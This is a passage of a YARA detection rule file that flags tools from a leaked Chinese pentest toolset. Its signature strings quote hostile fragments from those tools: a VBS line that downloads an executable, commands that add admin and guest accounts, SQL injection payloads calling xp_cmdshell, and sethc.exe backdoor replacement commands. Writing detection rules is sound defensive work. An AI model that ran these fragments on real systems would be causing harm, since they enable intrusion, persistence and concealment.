}

rule CN_Honker_ms10048_x64 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file ms10048-x64.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "418bec3493c85e3490e400ecaff5a7760c17a0d0"
	strings:
		$s1 = "[ ] Creating evil window" fullword ascii
		$s2 = "[+] Set to %d exploit half succeeded" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 125KB and all of them
}

rule CN_Honker_LogCleaner {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file LogCleaner.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "ab77ed5804b0394d58717c5f844d9c0da5a9f03e"
	strings:
		$s3 = ".exe <ip> [(path]" fullword ascii
		$s4 = "LogCleaner v" ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 250KB and all of them
}

rule CN_Honker_shell_brute_tool {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file shell_brute_tool.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "f6903a15453698c35dce841e4d09c542f9480f01"
	strings:
		$s0 = "http://24hack.com/xyadmin.asp" fullword ascii
		$s1 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii /* PEStudio Blacklist: agent */
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}

rule CN_Honker_hxdef100 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file hxdef100.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "bf30ccc565ac40073b867d4c7f5c33c6bc1920d6"
	strings:
		$s6 = "BACKDOORSHELL" fullword ascii
		$s15 = "%tmpdir%" fullword ascii
		$s16 = "%cmddir%" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and all of them
}

rule CN_Honker_Arp_EMP_v1_0 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Arp EMP v1.0.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "ae4954c142ad1552a2abaef5636c7ef68fdd99ee"
	strings:
		$s0 = "Arp EMP v1.0.exe" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 400KB and all of them
}

rule CN_Honker_GetWebShell {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file GetWebShell.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "b63b53259260a7a316932c0a4b643862f65ee9f8"
	strings:
		$s0 = "echo P.Open \"GET\",\"http://www.baidu.com/ma.exe\",0 >>run.vbs" fullword ascii
		$s5 = "http://127.0.0.1/sql.asp?id=1" fullword wide
		$s14 = "net user admin$ hack /add" fullword wide
		$s15 = ";Drop table [hack];create table [dbo].[hack] ([cmd] [image])--" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 70KB and 1 of them
}

rule CN_Honker_Cracker_SHELL {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file SHELL.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "c1dc349ff44a45712937a8a9518170da8d4ee656"
	strings:
		$s1 = "http://127.0.0.1/error1.asp" fullword ascii
		$s2 = "password,PASSWORD,pass,PASS,Lpass,lpass,Password" fullword wide
		$s3 = "\\SHELL" fullword wide
		$s4 = "WebBrowser1" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and all of them
}

rule CN_Honker_MSTSC_can_direct_copy {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file MSTSC_can_direct_copy.EXE"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "2f3cbfd9f82f8abafdb1d33235fa6bfa1e1f71ae"
	strings:
		$s1 = "srv\\newclient\\lib\\win32\\obj\\i386\\mstsc.pdb" fullword ascii
		$s2 = "Clear Password" fullword wide
		$s3 = "/migrate -- migrates legacy connection files that were created with " fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 600KB and all of them
}

rule CN_Honker_lcx_lcx {
	meta:
		description = "Sample from CN Honker Pentest Toolset - HTRAN - file lcx.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "0c8779849d53d0772bbaa1cedeca150c543ebf38"
	strings:
		$s1 = "%s -<listen|tran|slave> <option> [-log logfile]" fullword ascii
		$s2 = "=========== Code by lion & bkbll" ascii
		$s3 = "Welcome to [url]http://www.cnhonker.com[/url] " ascii
		$s4 = "-tran   <ConnectPort> <TransmitHost> <TransmitPort>" fullword ascii
		$s5 = "[+] Start Transmit (%s:%d <-> %s:%d) ......" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 30KB and 1 of them
}

rule CN_Honker_PostgreSQL {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file PostgreSQL.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "1ecfaa91aae579cfccb8b7a8607176c82ec726f4"
	strings:
		$s1 = "&http://192.168.16.186/details.php?id=1" fullword ascii
		$s2 = "PostgreSQL_inject" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2000KB and all of them
}

rule CN_Honker_WebRobot {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file WebRobot.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "af054994c911b4301490344fca4bb19a9f394a8f"
	strings:
		$s1 = "%d-%02d-%02d %02d^%02d^%02d ScanReprot.htm" fullword ascii
		$s2 = "\\log\\ProgramDataFile.dat" fullword ascii
		$s3 = "\\data\\FilterKeyword.txt" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 2000KB and all of them
}

rule CN_Honker_Baidu_Extractor_Ver1_0 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Baidu_Extractor_Ver1.0.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "1899f979360e96245d31082e7e96ccedbdbe1413"
	strings:
		$s3 = "\\Users\\Admin" fullword wide
		$s11 = "soso.com" fullword wide
		$s12 = "baidu.com" fullword wide
		$s19 = "cmd /c ping " fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 500KB and all of them
}

rule CN_Honker_FTP_scanning {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file FTP_scanning.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "5a3543ee5aed110c87cbc3973686e785bcb5c44e"
	strings:
		$s1 = "CNotSupportedE" fullword ascii
		$s2 = "nINet.dll" fullword ascii
		$s9 = "?=MODULE" fullword ascii
		$s13 = "MSIE 6*" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 550KB and all of them
}

rule CN_Honker_dirdown_dirdown {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file dirdown.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "7b8d51c72841532dded5fec7e7b0005855b8a051"
	strings:
		$s0 = "\\Decompress\\obj\\Release\\Decompress.pdb" fullword ascii
		$s1 = "Decompress.exe" fullword wide
		$s5 = "Get8Bytes" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 45KB and all of them
}

rule CN_Honker_Xiaokui_conversion_tool {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Xiaokui_conversion_tool.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "dccd163e94a774b01f90c1e79f186894e2f27de3"
	strings:
		$s1 = "update [dv_user] set usergroupid=1 where userid=2;--" fullword ascii
		$s2 = "To.exe" fullword wide
		$s3 = "by zj1244" ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 240KB and 2 of them
}

rule CN_Honker_GroupPolicyRemover {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file GroupPolicyRemover.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "7475d694e189b35899a2baa462957ac3687513e5"
	strings:
		$s0 = "GP_killer.EXE" fullword wide
		$s1 = "GP_killer Microsoft " fullword wide
		$s2 = "SHDeleteKeyA" fullword ascii  /* Goodware String - occured 79 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 700KB and all of them
}

rule CN_Honker_WordpressScanner {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file WordpressScanner.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "0b3c5015ba3616cbc616fc9ba805fea73e98bc83"
	strings:
		$s0 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii /* PEStudio Blacklist: agent */
		$s1 = "(http://www.eyuyan.com)" fullword wide
		$s2 = "GetConnectString" fullword ascii
		$s4 = "#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_CHS)" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}

rule CN_Honker_Htran_V2_40_htran20 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file htran20.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "b992bf5b04d362ed3757e90e57bc5d6b2a04e65c"
	strings:
		$s1 = "%s -slave  ConnectHost ConnectPort TransmitHost TransmitPort" fullword ascii
		$s2 = "Enter Your Socks Type No: [0.BindPort 1.ConnectBack 2.Listen]:" fullword ascii
		$s3 = "[SERVER]connection to %s:%d error" fullword ascii
		$s4 = "%s -connect ConnectHost [ConnectPort]       Default:%d" fullword ascii
		$s5 = "[+] got, ip:%s, port:%d" fullword ascii
		$s6 = "[-] There is a error...Create a new connection." fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and all of them
}

rule CN_Honker_DictionaryGenerator {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file DictionaryGenerator.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "b3071c64953e97eeb2ca6796fab302d8a77d27bc"
	strings:
		$s1 = "`PasswordBuilder" fullword ascii
		$s2 = "cracker" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3650KB and all of them
}

rule CN_Honker_ms11080_withcmd {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file ms11080_withcmd.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "745e5058acff27b09cfd6169caf6e45097881a49"
	strings:
		$s1 = "Usage : ms11-080.exe cmd.exe Command " fullword ascii
		$s3 = "[>] create pipe error" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 340KB and all of them
}

rule CN_Honker_T00ls_Lpk_Sethc_v2 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file T00ls Lpk Sethc v2.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "a995451d9108687b8892ad630a79660a021d670a"
	strings:
		$s1 = "LOADER ERROR" fullword ascii
		$s2 = "The procedure entry point %s could not be located in the dynamic link library %s" fullword ascii
		$s3 = "2011-2012 T00LS&RICES" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 800KB and all of them
}

rule CN_Honker_HASH_32 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file 32.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "bf4a8b4b3e906e385feab5ea768f604f64ba84ea"
	strings:
		$s5 = "[Undefined OS version]  Major: %d Minor: %d" fullword ascii
		$s8 = "Try To Run As Administrator ..." fullword ascii
		$s9 = "Specific LUID NOT found" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 240KB and all of them
}

rule CN_Honker_windows_mstsc_enhanced_RMDSTC {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file RMDSTC.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "3ca2b1b6f31219baf172abcc8f00f07f560e465f"
	strings:
		$s0 = "zava zir5@163.com" fullword wide
		$s1 = "By newccc" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 400KB and all of them
}

rule CN_Honker_sig_3389_mstsc_MSTSCAX {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file MSTSCAX.DLL"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "2fa006158b2d87b08f1778f032ab1b8e139e02c6"
	strings:
		$s1 = "ResetPasswordWWWx" fullword ascii
		$s2 = "Terminal Server Redirected Printer Doc" fullword wide
		$s3 = "Cleaning temp directory" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}

rule CN_Honker_T00ls_scanner {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file T00ls_scanner.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "70b04b910d82b32b90cd7f355a0e3e17dd260cb3"
	strings:
		$s0 = "http://cn.bing.com/search?first=1&count=50&q=ip:" fullword wide
		$s17 = "Team:www.t00ls.net" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 330KB and all of them
}

rule CN_Honker_GetHashes {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file GetHashes.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "dc8bcebf565ffffda0df24a77e28af681227b7fe"
	strings:
		$s0 = "SAM\\Domains\\Account\\Users\\Names registry hive reading error!" fullword ascii
		$s1 = "GetHashes <SAM registry file> [System key file]" fullword ascii
		$s2 = "Note: Windows registry file shall begin from 'regf' signature!" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 87KB and 2 of them
}

rule CN_Honker_hashq_Hashq {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Hashq.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "7518b647db5275e8a9e0bf4deda3d853cc9d5661"
	strings:
		$s1 = "Hashq.exe" fullword wide
		$s5 = "CnCert.Net" fullword wide
		$s6 = "Md5 query tool" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 600KB and all of them
}

rule CN_Honker_ShiftBackdoor_Server {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Server.dat"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "b24d761c6bbf216792c4833890460e8b37d86b37"
	strings:
		$s0 = "del /q /f %systemroot%system32sethc.exe" fullword ascii
		$s1 = "cacls %s /t /c /e /r administrators" fullword ascii
		$s2 = "\\dllcache\\sethc.exe" fullword ascii
		$s3 = "\\ntvdm.exe" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and 2 of them
}

rule CN_Honker_exp_win2003 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file win2003.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "47164c8efe65d7d924753fadf6cdfb897a1c03db"
	strings:
		$s1 = "Usage:system_exp.exe \"cmd\"" fullword ascii
		$s2 = "The shell \"cmd\" success!" fullword ascii
		$s4 = "Not Windows NT family OS." fullword ascii /* PEStudio Blacklist: os */
	condition:
		uint16(0) == 0x5a4d and filesize < 100KB and all of them
}

rule CN_Honker_Interception3389_setup {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file setup.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "f5b2f86f8e7cdc00aa1cb1b04bc3d278eb17bf5c"
	strings:
		$s0 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\%s" fullword ascii
		$s1 = "%s\\temp\\temp%d.bat" fullword ascii
		$s5 = "EventStartShell" fullword ascii
		$s6 = "del /f /q \"%s\"" fullword ascii
		$s7 = "\\wminotify.dll" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 400KB and all of them
}

rule CN_Honker_CnCerT_CCdoor_CMD_2 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file CnCerT.CCdoor.CMD.dll2"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "7f3a6fb30845bf366e14fa21f7e05d71baa1215a"
	strings:
		$s0 = "cmd.dll" fullword wide
		$s1 = "cmdpath" fullword ascii
		$s2 = "Get4Bytes" fullword ascii
		$s3 = "ExcuteCmd" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 22KB and all of them
}

rule CN_Honker_exp_ms11046 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file ms11046.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "f8414a374011fd239a6c6d9c6ca5851cd8936409"
	strings:
		$s0 = "[*] Token system command" fullword ascii
		$s1 = "[*] command add user 90sec 90sec" fullword ascii
		$s2 = "[*] Add to Administrators success" fullword ascii
		$s3 = "Program: %s%s%s%s%s%s%s%s%s%s%s" fullword ascii  /* Goodware String - occured 3 times */
	condition:
		uint16(0) == 0x5a4d and filesize < 300KB and all of them
}

rule CN_Honker_Master_beta_1_7 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Master_beta_1.7.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "3be7a370791f29be89acccf3f2608fd165e8059e"
	strings:
		$s1 = "http://seo.chinaz.com/?host=" fullword ascii
		$s2 = "Location: getpass.asp?info=" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 312KB and all of them
}

rule CN_Honker_F4ck_Team_f4ck_2 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file f4ck_2.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "0783661077312753802bd64bf5d35c4666ad0a82"
	strings:
		$s1 = "F4ck.exe" fullword wide
		$s2 = "@Netapi32.dll" fullword ascii
		$s3 = "Team.F4ck.Net" fullword wide
		$s8 = "Administrators" fullword ascii  /* Goodware String - occured 14 times */
		$s9 = "F4ck Team" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 220KB and 2 of them
}

rule CN_Honker_sig_3389_80_AntiFW {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file AntiFW.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "5fbc75900e48f83d0e3592ea9fa4b70da72ccaa3"
	strings:
		$s1 = "Set TS to port:80 Successfully!" fullword ascii
		$s2 = "Now,set TS to port 80" fullword ascii
		$s3 = "echo. >>amethyst.reg" fullword ascii
		$s4 = "del amethyst.reg" fullword ascii
		$s5 = "AntiFW.cpp" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 30KB and 2 of them
}

rule CN_Honker_wwwscan_gui {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file wwwscan_gui.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "897b66a34c58621190cb88e9b2a2a90bf9b71a53"
	strings:
		$s1 = "%s www.target.com -p 8080 -m 10 -t 16" fullword ascii
		$s2 = "/eye2007Admin_login.aspx" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 280KB and all of them
}

rule CN_Honker_SwordCollEdition {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file SwordCollEdition.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "6e14f21cac6e2aa7535e45d81e8d1f6913fd6e8b"
	strings:
		$s0 = "YuJianScan.exe" fullword wide
		$s1 = "YuJianScan" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 225KB and all of them
}

rule CN_Honker_HconSTFportable {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file HconSTFportable.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "00253a00eadb3ec21a06911a3d92728bbbe80c09"
	strings:
		$s1 = "HconSTFportable.exe" fullword wide
		$s2 = "www.Hcon.in" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 354KB and all of them
}

rule CN_Honker_T00ls_Lpk_Sethc_v3_LPK {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file LPK.DAT"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "cf2549bbbbdb7aaf232d9783873667e35c8d96c1"
	strings:
		$s1 = "FreeHostKillexe.exe" fullword ascii
		$s2 = "\\sethc.exe /G everyone:F" fullword ascii
		$s3 = "c:\\1.exe" fullword ascii
		$s4 = "Set user Group Error! Username:" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 400KB and all of them
}

rule CN_Honker_Without_a_trace_Wywz {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Wywz.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "f443c43fde643228ee95def5c8ed3171f16daad8"
	strings:
		$s1 = "\\Symantec\\Norton Personal Firewall\\Log\\Content.log" fullword ascii
		$s2 = "UpdateFile=d:\\tool\\config.ini,Option\\\\proxyIp=127.0.0.1\\r\\nproxyPort=808" ascii
		$s3 = "%s\\subinacl.exe /subkeyreg \"%s\" /Grant=%s=f /Grant=everyone=f" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1800KB and all of them
}

rule CN_Honker_LPK2_0_LPK {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file LPK.DAT"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "5a1226e73daba516c889328f295e728f07fdf1c3"
	strings:
		$s1 = "\\sethc.exe /G everyone:F" fullword ascii
		$s2 = "net1 user guest guest123!@#" fullword ascii
		$s3 = "\\dllcache\\sethc.exe" fullword ascii
		$s4 = "sathc.exe 211" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 1030KB and all of them
}

rule CN_Honker_cleaniis {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file cleaniis.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "372bc64c842f6ff0d9a1aa2a2a44659d8b88cb40"
	strings:
		$s1 = "iisantidote <logfile dir> <ip or string to hide>" fullword ascii
		$s4 = "IIS log file cleaner by Scurt" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 200KB and all of them
}

rule CN_Honker_arp3_7_arp3_7 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file arp3.7.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "db641a9dfec103b98548ac7f6ca474715040f25c"
	strings:
		$s1 = "CnCerT.Net.SKiller.exe" fullword wide
		$s2 = "www.80sec.com" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 4000KB and all of them
}

rule CN_Honker_exp_ms11080 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file ms11080.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "f0854c49eddf807f3a7381d3b20f9af4a3024e9f"
	strings:
		$s2 = "[*] command add user 90sec 90sec" fullword ascii
		$s6 = "[*] Add to Administrators success" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 840KB and all of them
}

rule CN_Honker_Injection_transit {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Injection_transit.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "f4fef2e3d310494a3c3962a49c7c5a9ea072b2ea"
	strings:
		$s0 = "<description>Your app description here</description> " fullword ascii
		$s4 = "Copyright (C) 2003 ZYDSoft Corp." fullword wide /* PEStudio Blacklist: os */
		$s5 = "ScriptnackgBun" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3175KB and all of them
}

rule CN_Honker_Safe3WVS {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Safe3WVS.EXE"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "fee3acacc763dc55df1373709a666d94c9364a7f"
	strings:
		$s0 = "2TerminateProcess" fullword ascii
		$s1 = "mscoreei.dll" fullword ascii /* reversed goodware string 'lld.ieerocsm' */
		$s7 = "SafeVS.exe" fullword wide
		$s8 = "www.safe3.com.cn" fullword wide
		$s20 = "SOFTWARE\\Classes\\Interface\\" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 3000KB and all of them
}

rule CN_Honker_NBSI_3_0 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file NBSI 3.0.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "93bf0f64bec926e9aa2caf4c28df9af27ec0e104"
	strings:
		$s1 = ";use master declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamet" wide
		$s2 = "http://localhost/1.asp?id=16" fullword ascii
		$s3 = " exec master.dbo.xp_cmdshell @Z--" fullword wide
		$s4 = ";use master declare @o int exec sp_oacreate 'wscript.shell',@o out exec sp_oamet" wide
	condition:
		uint16(0) == 0x5a4d and filesize < 2600KB and 2 of them
}

rule CN_Honker_sig_3389_DUBrute_v3_0_RC3_2_0 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file 2.0.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "e8ee982421ccff96121ffd24a3d84e3079f3750f"
	strings:
		$s0 = "IP - %d; Login - %d; Password - %d; Combination - %d" fullword ascii
		$s3 = "Create %d IP@Loginl;Password" fullword ascii
		$s15 = "UBrute.com" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 980KB and 2 of them
}

rule CN_Honker_hkmjjiis6 {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file hkmjjiis6.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "4cbc6344c6712fa819683a4bd7b53f78ea4047d7"
	strings:
		$s14 = "* FROM IIsWebInfo/r" fullword ascii
		$s19 = "ltithread4ck/" fullword ascii
		$s20 = "LookupAcc=Sid#" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 175KB and all of them
}

rule CN_Honker_clearlogs {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file clearlogs.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "490f3bc318f415685d7e32176088001679b0da1b"
	strings:
		$s2 = "- http://ntsecurity.nu/toolbox/clearlogs/" fullword ascii
		$s4 = "Error: Unable to clear log - " fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 140KB and all of them
}

rule CN_Honker_no_net_priv_esc_AddUser {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file AddUser.dll"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "4c95046be6ae40aee69a433e9a47f824598db2d4"
	strings:
		$s0 = "PECompact2" fullword ascii
		$s1 = "adduser" fullword ascii
		$s5 = "OagaBoxA" fullword ascii
	condition:
		uint16(0) == 0x5a4d and filesize < 115KB and all of them
}

rule CN_Honker_Injection {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file Injection.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "3484ed16e6f9e0d603cbc5cb44e46b8b7e775d35"
	strings:
		$s0 = "http://127.0.0.1/6kbbs/bank.asp" fullword ascii
		$s7 = "jmPost.asp" fullword wide
	condition:
		uint16(0) == 0x5a4d and filesize < 220KB and all of them
}

rule CN_Honker_SQLServer_inject_Creaked {
	meta:
		description = "Sample from CN Honker Pentest Toolset - file SQLServer_inject_Creaked.exe"
		author = "Florian Roth"
		reference = "Disclosed CN Honker Pentest Toolset"
		date = "2015-06-23"
		score = 70
		hash = "af3c41756ec8768483a4cf59b2e639994426e2c2"
	strings:
		$s1 = "http://localhost/index.asp?id=2" fullword ascii
		$s2 = "Email:zhaoxypass@yahoo.com.cn<br>" fullword ascii
	condition:
